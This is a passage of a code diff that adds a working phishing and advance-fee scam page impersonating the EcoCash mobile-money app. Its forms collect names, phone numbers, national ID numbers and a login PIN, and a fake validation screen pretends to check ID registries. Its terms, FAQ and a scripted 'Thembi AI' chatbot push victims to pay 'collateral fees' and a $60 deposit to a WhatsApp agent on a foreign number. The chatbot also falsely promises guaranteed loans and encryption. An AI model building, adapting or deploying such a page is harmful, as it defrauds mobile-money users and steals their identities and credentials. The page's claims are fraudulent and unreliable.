+                            <span class="bg-ecored text-white text-[10px] font-extrabold px-2.5 py-0.5 rounded-full uppercase tracking-wider shadow-sm animate-pulse">🔥 Super Bundle Offer</span>
+                            <span class="text-[10px] text-blue-200 font-semibold"><i class="fa-regular fa-clock"></i> 30 Days Validity</span>
+                        </div>
+                        
+                        <div class="flex items-center space-x-3 mb-3">
+                            <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=200&q=80" alt="People browsing internet" class="w-12 h-12 rounded-lg object-cover border-2 border-white/80 shadow flex-shrink-0">
+                            <div>
+                                <h3 class="text-sm font-extrabold text-white leading-snug">Buy 28GB for only $10 USD</h3>
+                                <p class="text-[11px] text-blue-100 font-medium">Browse, stream & work seamlessly for <span class="font-bold text-yellow-300">30 Days</span>!</p>
+                            </div>
+                        </div>
+
+                        <button onclick="buyBundlePromo('28GB for $10 USD (30 Days)')" class="w-full bg-white text-ecoblue hover:bg-yellow-300 hover:text-gray-900 font-extrabold py-2 px-3 rounded-lg text-xs uppercase tracking-wider transition shadow flex items-center justify-center space-x-2">
+                            <i class="fa-solid fa-cart-shopping"></i>
+                            <span>BUY BUNDLE VIA WHATSAPP</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="text-center py-3 text-xs font-semibold text-gray-600 dark:text-gray-400">
+                    ©2026 EcoCash Super App
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN ================= -->
+            <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col items-center justify-center text-center">
+                <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-lg border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6">
+                    <div id="process-spinner-container" class="relative w-20 h-20 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
+                        <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                        <i id="process-icon" class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                    </div>
+
+                    <div class="space-y-2">
+                        <h3 id="process-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Validating Details & Transactions</h3>
+                        <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and credentials...</p>
+                    </div>
+
+                    <div class="space-y-2 pt-2">
+                        <div class="h-4 w-full skeleton rounded"></div>
+                        <div class="h-4 w-3/4 skeleton rounded"></div>
+                    </div>
+
+                    <div class="bg-gray-50 dark:bg-gray-700 p-3 rounded-lg border border-gray-200 dark:border-gray-600 text-left text-[11px] space-y-1 text-gray-600 dark:text-gray-300">
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Checking National & Regional ID Registry</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Verifying 6-Month Wallet History</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Validating Guaranteed Loan Eligibility</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 5: BOOST MY KASHAGI LOANS FORM ================= -->
+            <section id="view-boost-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800">
+                <div class="bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border border-gray-100 dark:border-gray-700 mb-6">
+                    <div class="flex items-center justify-between mb-4">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <div class="text-right">
+                            <span class="text-[10px] font-bold text-ecoblue uppercase">Step 2 of 4</span>
+                            <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Boost Loan Details</h2>
+                        </div>
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-4 text-xs text-gray-700 dark:text-gray-300">
+                        <!-- Full Name -->
+                        <div>
+                            <label class="block font-medium mb-1">1. Full Names <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="boost-name" placeholder="Full Names as per ID" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                                <span id="boost-name-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-name-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Name (Letters only)</p>
+                        </div>
+
+                        <!-- Phone Number -->
+                        <div>
+                            <label class="block font-medium mb-1">2. Phone Number (Starting with 7) <span class="text-red-500">*</span></label>
+                            <div class="flex items-center border border-gray-200 dark:border-gray-700 dark:bg-gray-700 rounded-md overflow-hidden focus-within:border-ecoblue relative">
+                                <span class="bg-gray-100 dark:bg-gray-600 px-3 py-2.5 text-gray-600 dark:text-gray-200 font-semibold text-sm border-r border-gray-200 dark:border-gray-600">+263</span>
+                                <input type="tel" inputmode="numeric" pattern="[0-9]*" id="boost-phone" placeholder="712345678" maxlength="9" class="w-full p-2.5 text-sm outline-none dark:bg-gray-700 dark:text-white" oninput="validateBoostForm()">
+                                <span id="boost-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Phone (9 digits starting with 7)</p>
+                        </div>
+
+                        <!-- National ID -->
+                        <div>
+                            <label class="block font-medium mb-1">3. National ID Number <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
+                                <span id="boost-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden font-medium">Incorrect ID format (e.g., 63-1234567A89)</p>
+                        </div>
+
+                        <!-- Current Loan Amount -->
+                        <div>
+                            <label class="block font-medium mb-1">4. Current Kashagi Loan Amount (USD) <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="number" inputmode="numeric" pattern="[0-9]*" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                                <span id="boost-loan-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="boost-loan-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Amount (Numbers only)</p>
+                        </div>
+
+                        <div class="pt-4">
+                            <button type="button" id="boost-submit-btn" disabled onclick="startProcessingFlow('boost')" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                                NEXT: SELECT UPGRADE TIER
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 6: TIER UPGRADE & EXACT AMOUNTS TABLE ================= -->
+            <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-3">
+                        <button onclick="switchTabWithDim('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <div class="text-right">
+                            <span class="text-[10px] font-bold text-ecoblue uppercase">Step 3 of 4</span>
+                            <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Select Loan Upgrade Tier</h2>
+                        </div>
+                    </div>
+
+                    <p class="text-xs text-gray-600 dark:text-gray-400 mb-4">Select your target tier below. Exact required activation/collateral fees are indicated clearly for each tier.</p>
+
+                    <!-- Tier Table / Selection Cards with exact amounts -->
+                    <div class="space-y-3 max-h-[350px] overflow-y-auto pr-1 no-scrollbar" id="tier-options-container">
+                        <!-- Populated via Javascript -->
+                    </div>
+                </div>
+
+                <div class="pt-4">
+                    <button type="button" id="upgrade-btn" disabled onclick="proceedToTerms()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                        NEXT: REVIEW TERMS & CONFIRM
+                    </button>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 7: TERMS AND CONDITIONS ================= -->
+            <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
+                <div class="flex-1 flex flex-col">
+                    <div class="flex items-center justify-between mb-2">
+                        <button onclick="goBackFromTerms()" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <div class="text-right">
+                            <span class="text-[10px] font-bold text-ecoblue uppercase">Step 4 of 4</span>
+                            <h2 class="text-sm font-extrabold text-gray-800 dark:text-gray-100">Final Agreement & Submit</h2>
+                        </div>
+                    </div>
+                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-2 text-center">Please read the terms below and check the agreement box to submit.</p>
+
+                    <!-- Full Page Scrollable Terms Box -->
+                    <div id="terms-scroll-box" class="bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-lg p-4 flex-1 h-[270px] overflow-y-auto text-xs text-gray-700 dark:text-gray-300 space-y-3 shadow-inner leading-relaxed">
+                        <p class="font-semibold text-gray-900 dark:text-gray-100">1. Agreement to Digital Credit Terms: By checking the agreement box below and submitting your Kashagi Loan application or boost via EcoCash, you enter into a legally binding financial agreement with EcoCash and regulated microfinance partners.</p>
+                        <p>2. Privacy and Data Protection: EcoCash is deeply committed to protecting your personal information. All submitted national identification credentials, phone numbers, and PIN data are encrypted with bank-grade 256-bit protocols, strictly adhering to international data privacy regulations.</p>
+                        <p>3. Safety and Fraud Prevention: Your account security is paramount. Never share your 4-digit EcoCash PIN or password with any third party, customer care agent, or unauthorized personnel. EcoCash will never ask for your PIN over phone calls or messages.</p>
+                        <p>4. Loan Repayment and Collateral: All disbursed Kashagi loan credit lines require upfront collateral activation fees (5% for boost tiers or 10% for full new applications) prior to wallet disbursement. Repayments are automatically debited on maturity.</p>
+                        <p class="font-semibold text-gray-800 dark:text-gray-200 bg-blue-50 dark:bg-gray-700 p-2 rounded border border-blue-200 dark:border-gray-600">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly $60 USD. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification (+254786464611).</p>
+                        <p>6. Default Consequences: Failure to clear outstanding loan balances on time results in credit score penalties, temporary wallet restriction, and potential debt recovery through registered mobile subscriber lines.</p>
+                        <p class="font-semibold text-ecoblue">7. Final Acceptance: By checking the agreement box below and clicking submit, you certify that all entered profile data is accurate and you consent to our security guidelines.</p>
+                    </div>
+
+                    <!-- Explicit Agree Checkbox -->
+                    <div class="bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 rounded-lg p-3 mt-3 flex items-start space-x-2 shadow-sm">
+                        <input type="checkbox" id="explicit-agree-checkbox" onchange="toggleAgreeCheckbox()" class="mt-0.5 w-4 h-4 rounded text-ecoblue focus:ring-ecoblue cursor-pointer flex-shrink-0">
+                        <label for="explicit-agree-checkbox" class="text-[11px] text-gray-800 dark:text-gray-200 font-medium leading-tight cursor-pointer">
+                            I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines, including the $60 USD final deposit requirement with my assigned agent.
+                        </label>
+                    </div>
+                </div>
+
+                <div class="pt-3">
+                    <button type="button" id="agree-terms-btn" disabled onclick="handleFinalAgreement()" class="w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md">
+                        AGREE & SUBMIT ALL TO WHATSAPP
+                    </button>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS ================= -->
+            <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-3">
+                        <button onclick="switchTabWithDim('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
+                            <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
+                        </button>
+                        <div class="text-right">
+                            <span class="text-[10px] font-bold text-supergreen uppercase">Steps 2 & 3 of 4</span>
+                            <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Kashagi Loan Registration</h2>
+                        </div>
+                    </div>
+
+                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-3">Select your loan registration tier ($100 to $3000 USD) with exact 10% fee calculated automatically.</p>
+
+                    <!-- Full Application Tier Table Selector -->
+                    <div class="space-y-2 mb-4 max-h-[200px] overflow-y-auto pr-1 no-scrollbar" id="apply-tier-options-container">
+                        <!-- Populated via JavaScript -->
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-2.5 text-xs text-gray-700 dark:text-gray-300">
+                        <!-- Full Name -->
+                        <div>
+                            <label class="block font-medium mb-1">Full Names <span class="text-red-500">*</span></label>
+                            <div class="relative">
+                                <input type="text" id="apply-name" placeholder="Full Names" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
+                                <span id="apply-name-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                            </div>
+                            <p id="apply-name-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Name (Letters only)</p>
+                        </div>
+
+                        <div class="grid grid-cols-2 gap-2">
+                            <!-- Mobile -->
+                            <div>
+                                <label class="block font-medium mb-1">Mobile (+263) <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <input type="tel" inputmode="numeric" pattern="[0-9]*" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                    <span id="apply-phone-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
+                                <p id="apply-phone-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Mobile (9 digits)</p>
+                            </div>
+                            <!-- National ID -->
+                            <div>
+                                <label class="block font-medium mb-1">National ID <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <input type="text" id="apply-nid" placeholder="63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none uppercase" oninput="validateApplyForm()">
+                                    <span id="apply-nid-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
+                            </div>
+                        </div>
+                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect ID format (e.g., 63-1234567A89)</p>
+
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-medium mb-1">Employment <span class="text-red-500">*</span></label>
+                                <select id="apply-employment" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs outline-none bg-white dark:bg-gray-700" onchange="validateApplyForm()">
+                                    <option value="">Select</option>
+                                    <option value="Employed">Employed</option>
+                                    <option value="Self-Employed">Self-Employed</option>
+                                    <option value="Business Owner">Business Owner</option>
+                                </select>
+                            </div>
+                            <!-- Monthly Income -->
+                            <div>
+                                <label class="block font-medium mb-1">Monthly Income (USD) <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <input type="number" inputmode="numeric" pattern="[0-9]*" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                                    <span id="apply-income-icon" class="absolute right-3 top-2.5 hidden text-sm"></span>
+                                </div>
+                                <p id="apply-income-error" class="text-[10px] text-red-600 mt-0.5 hidden">Incorrect Amount</p>
+                            </div>
+                        </div>
+                    </form>
+                </div>
+
+                <div class="pt-3">
+                    <button type="button" id="apply-submit-btn" disabled onclick="startProcessingFlow('apply')" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                        NEXT: REVIEW TERMS & CONFIRM (10% FEE)
+                    </button>
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 9: CONTACT US & DEDICATED HELP CENTER ================= -->
+            <section id="view-contact" class="hidden flex-1 flex flex-col bg-white dark:bg-gray-800 transition-colors">
+                <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white p-6 relative flex justify-between items-center overflow-hidden min-h-[140px]">
+                    <h2 class="text-2xl font-semibold z-10">Dedicated Help Center</h2>
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=300&q=80" alt="Customer Support" class="w-32 h-32 object-cover rounded-full absolute -right-4 -bottom-4 border-2 border-white shadow-lg opacity-90">
+                </div>
+
+                <div class="p-5 space-y-6">
+                    <div class="text-center space-y-1">
+                        <h3 class="text-2xl font-extrabold text-gray-900 dark:text-gray-100 tracking-tight">Frequently Asked Questions</h3>
+                        <p class="text-xs text-gray-600 dark:text-gray-400 px-4">Instant answers regarding guaranteed loans, data bundles, and agent deposits</p>
+                    </div>
+
+                    <!-- FAQ Accordion Container -->
+                    <div class="space-y-2.5 text-xs">
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: Are Kashagi loans guaranteed without a guarantor?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Yes! All Kashagi microloans are guaranteed with no guarantor needed, based on your last 6 months of active wallet transaction history and ID verification.</p>
+                        </div>
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: What is the $60 USD final deposit requirement?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Once your account is successfully updated, a final deposit of $60 USD is required to activate your spending balance. Deposits are made directly to your personally assigned agent via WhatsApp (+254786464611).</p>
+                        </div>
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: How do I buy the 28GB for $10 USD bundle?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Simply click the Airtime & Bundles icon or promotional 'Buy Bundle' banner on your dashboard, and it will automatically format your request to our official WhatsApp line for instant credit.</p>
+                        </div>
+                    </div>
+
+                    <div class="space-y-4 pt-2">
+                        <div class="bg-cardblue text-white rounded-2xl p-4 text-center shadow-md space-y-1">
+                            <i class="fa-regular fa-user text-2xl mb-0.5 inline-block"></i>
+                            <h4 class="text-sm font-semibold">Customer Care Helpline</h4>
+                            <p class="text-lg font-bold tracking-wide">114 or +263 772 023 000</p>
+                        </div>
+                    </div>
+
+                    <!-- Contact Form Card -->
+                    <div class="bg-white dark:bg-gray-700 rounded-xl shadow-lg border border-gray-100 dark:border-gray-600 p-5 space-y-4">
+                        <h4 class="font-bold text-sm text-gray-800 dark:text-gray-100">Send Direct Message to Support</h4>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your name <span class="text-red-500">*</span></label>
+                            <input type="text" id="contact-name" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your email <span class="text-red-500">*</span></label>
+                            <input type="email" id="contact-email" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                            <input type="tel" inputmode="numeric" pattern="[0-9]*" id="contact-phone" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your message <span class="text-red-500">*</span></label>
+                            <textarea rows="3" id="contact-message" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()"></textarea>
+                        </div>
+                        <button type="button" id="contact-btn" disabled onclick="handleContactSubmit()" class="w-full bg-gray-200 dark:bg-gray-600 text-gray-400 dark:text-gray-300 font-bold py-3 rounded-md cursor-not-allowed transition">
+                            Send Message
+                        </button>
+                    </div>
+
+                    <!-- Footer Section -->
+                    <div class="pt-6 pb-4 text-center space-y-3 text-xs text-gray-700 dark:text-gray-400">
+                        <div class="text-xl font-extrabold tracking-tight">
+                            <span class="text-ecoblue">Eco</span><span class="text-ecored">Cash</span>
+                        </div>
+                        <p>Copyright © 2026 EcoCash. All rights reserved. Guaranteed Loans & Secure Compliance.</p>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+
+        <!-- FLOATING WIDGETS -->
+        <!-- Ask Thembi AI Chatbot Button -->
+        <div class="fixed bottom-20 right-4 z-50">
+            <button onclick="toggleChatbot()" class="bg-ecoblue text-white p-3.5 rounded-full shadow-xl hover:bg-ecodarkblue transition flex items-center space-x-2">
+                <i class="fa-solid fa-robot text-lg"></i>
+                <span class="text-xs font-bold pr-1">Ask Thembi</span>
+            </button>
+        </div>
+
+        <!-- Chatbot Modal Drawer -->
+        <div id="chatbot-modal" class="hidden fixed inset-0 z-50 bg-black/50 flex items-end justify-center sm:items-center p-2">
+            <div class="bg-white dark:bg-gray-800 w-full max-w-sm rounded-t-2xl sm:rounded-2xl shadow-2xl flex flex-col h-[520px] overflow-hidden">
+                <!-- Chat Header -->
+                <div class="bg-ecoblue text-white p-4 flex justify-between items-center">
+                    <div class="flex items-center space-x-2">
+                        <div class="w-8 h-8 rounded-full bg-white text-ecoblue flex items-center justify-center font-bold">
+                            <i class="fa-solid fa-robot text-sm"></i>
+                        </div>
+                        <div>
+                            <h4 class="font-bold text-sm">Ask Thembi AI</h4>
+                            <p class="text-[10px] text-blue-100">EcoCash Virtual Assistant</p>
+                        </div>
+                    </div>
+                    <button onclick="toggleChatbot()" class="text-white hover:text-gray-200">
+                        <i class="fa-solid fa-xmark text-lg"></i>
+                    </button>
+                </div>
+
+                <!-- Chat Messages Area -->
+                <div id="chat-messages" class="flex-1 p-3 overflow-y-auto space-y-3 bg-gray-50 dark:bg-gray-900 text-xs">
+                    <div class="bg-white dark:bg-gray-800 p-3 rounded-xl shadow-sm border border-gray-200 dark:border-gray-700 space-y-1">
+                        <p class="font-semibold text-ecoblue">Hello! I am Thembi, your EcoCash AI assistant.</p>
+                        <p class="text-gray-600 dark:text-gray-300">Select any question below or ask me anything regarding Guaranteed Loans and Data Bundles!</p>
+                    </div>
+                </div>
+
+                <!-- Suggested Questions Chips Container -->
+                <div class="p-2 bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700">
+                    <p class="text-[10px] font-bold text-gray-500 dark:text-gray-400 mb-1.5 px-1">Common Questions:</p>
+                    <div class="flex space-x-2 overflow-x-auto no-scrollbar pb-1" id="faq-chips-container">
+                        <!-- Populated via JS -->
+                    </div>
+                </div>
+
+                <!-- Chat Input -->
+                <div class="p-3 bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700 flex space-x-2">
+                    <input type="text" id="chat-input" placeholder="Type your question..." class="flex-1 border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-lg px-3 py-2 text-xs outline-none focus:border-ecoblue" onkeypress="if(event.key==='Enter') sendChatMessage()">
+                    <button onclick="sendChatMessage()" class="bg-ecoblue text-white px-3.5 py-2 rounded-lg text-xs font-bold hover:bg-ecodarkblue transition">
+                        <i class="fa-solid fa-paper-plane"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div id="whatsapp-widget" class="hidden fixed bottom-4 right-4 flex items-center z-50 space-x-2 cursor-pointer" onclick="openWhatsAppChat('Hello, I need assistance with my EcoCash account.')">
+            <div class="bg-white dark:bg-gray-700 text-gray-800 dark:text-gray-200 text-xs px-3 py-1.5 rounded-full shadow-md font-medium border border-gray-100 dark:border-gray-600 flex items-center">
+                Say Hi to Thembi
+            </div>
+            <button class="w-12 h-12 bg-green-500 text-white rounded-full flex items-center justify-center shadow-xl hover:bg-green-600 transition">
+                <i class="fa-brands fa-whatsapp text-2xl"></i>
+            </button>
+        </div>
+
+    </div>
+
+    <!-- APPLICATION LOGIC & INTERACTIVITY -->
+    <script>
+        // Updated WhatsApp target number
+        const TARGET_WHATSAPP_NUMBER = '254786464611';
+
+        // Global State variables
+        let clientData = {
+            loginPhone: '',
+            loginPin: '',
+            name: '',
+            phone: '',
+            nid: '',
+            currentLoan: 0,
+            selectedTierAmount: 100,
+            selectedTierFee: 5,
+            selectedApplyAmount: 500,
+            selectedApplyFee: 50,
+            flowType: 'boost'
+        };
+
+        // Dark Mode Toggle Function
+        function toggleDarkMode() {
+            const htmlEl = document.documentElement;
+            const iconEl = document.getElementById('dark-mode-icon');
+            htmlEl.classList.toggle('dark');
+            if (htmlEl.classList.contains('dark')) {
+                iconEl.className = "fa-solid fa-sun text-xs";
+                localStorage.setItem('ecocash_theme', 'dark');
+            } else {
+                iconEl.className = "fa-solid fa-moon text-xs";
+                localStorage.setItem('ecocash_theme', 'light');
+            }
+        }
+
+        if (localStorage.getItem('ecocash_theme') === 'dark') {
+            document.documentElement.classList.add('dark');
+            document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
+        }
+
+        // Client FAQ questions for Ask Thembi AI
+        const thembiFAQs = [
+            { 
+                q: "What is the final $60 USD deposit requirement?", 
+                part1: "Part 1: Account Activation Deposit — Once your account and credit tier have been successfully updated, clients are required to make a final deposit of $60 USD.", 
+                part2: "Part 2: Spending Activation — After completing this deposit with your personally assigned agent via WhatsApp (+254786464611), your account is fully activated for spending." 
+            },
+            { 
+                q: "Are Kashagi loans guaranteed without guarantors?", 
+                part1: "Part 1: Guaranteed Funding — Yes! Kashagi microloans require no guarantor needed. Approval is based on your secure ID and 6-month wallet transaction history.", 
+                part2: "Part 2: Instant Disbursal — Once validated and fees are cleared, funds transfer immediately into your active EcoCash wallet." 
+            },
+            { 
+                q: "How do I buy the 28GB for $10 USD bundle?", 
+                part1: "Part 1: Instant Purchase — Click the 'Airtime & Bundles' icon or 'BUY BUNDLE VIA WHATSAPP' button on your dashboard to initiate your 28GB bundle request.", 
+                part2: "Part 2: Activation — Complete your payment via EcoCash wallet and your 30-day internet bundle will be credited immediately." 
+            },
+            { 
+                q: "How do I qualify for Kashagi Loans?", 
+                part1: "Part 1: Account Requirements — Ensure your EcoCash wallet is active, your phone number is correct, and you have at least 6 months of active transaction history.", 
+                part2: "Part 2: Identity Verification — Provide an authentic National ID and complete your profile registration successfully." 
+            },
+            { 
+                q: "What is the collateral fee for boosting?", 
+                part1: "Part 1: Fee Percentage — The activation collateral fee for boosting your Kashagi credit limit is exactly 5% of your target upgrade amount.", 
+                part2: "Part 2: Exact Amounts — For example, a $100 tier requires a $5.00 fee, a $500 tier requires $25.00, and a $3,000 tier requires $150.00." 
+            },
+            { 
+                q: "How much is the fee for full applications?", 
+                part1: "Part 1: New Loan Requirements — Full loan registrations and new applications require a 10% collateral activation fee prior to disbursement.", 
+                part2: "Part 2: Exact Amounts — Ranging from $100 ($10 fee) all the way up to $3000 ($300 fee) across our secure tier table." 
+            },
+            { 
+                q: "Is my ID and personal data safe?", 
+                part1: "Part 1: Security Encryption — All personal details, phone numbers, and National ID records are encrypted with bank-grade 256-bit security protocols.", 
+                part2: "Part 2: Privacy Compliance — We strictly adhere to international financial data privacy laws to ensure your information remains confidential and fully protected." 
+            },
+            { 
+                q: "How long does loan disbursement take?", 
+                part1: "Part 1: Verification Process — Once you submit your details and complete the 5-second credential validation check, your application is ready.", 
+                part2: "Part 2: Instant Transfer — After confirming your collateral fee payment via WhatsApp, funds are disbursed instantly into your EcoCash wallet." 
+            }
+        ];
+
+        function initChatbotFAQs() {
+            const container = document.getElementById('faq-chips-container');
+            container.innerHTML = '';
+            thembiFAQs.forEach(faq => {
+                const btn = document.createElement('button');
+                btn.className = "whitespace-nowrap bg-blue-50 dark:bg-gray-700 text-ecoblue dark:text-blue-300 hover:bg-ecoblue hover:text-white px-2.5 py-1.5 rounded-lg text-[11px] font-medium transition border border-blue-100 dark:border-gray-600 flex-shrink-0";
+                btn.innerText = faq.q;
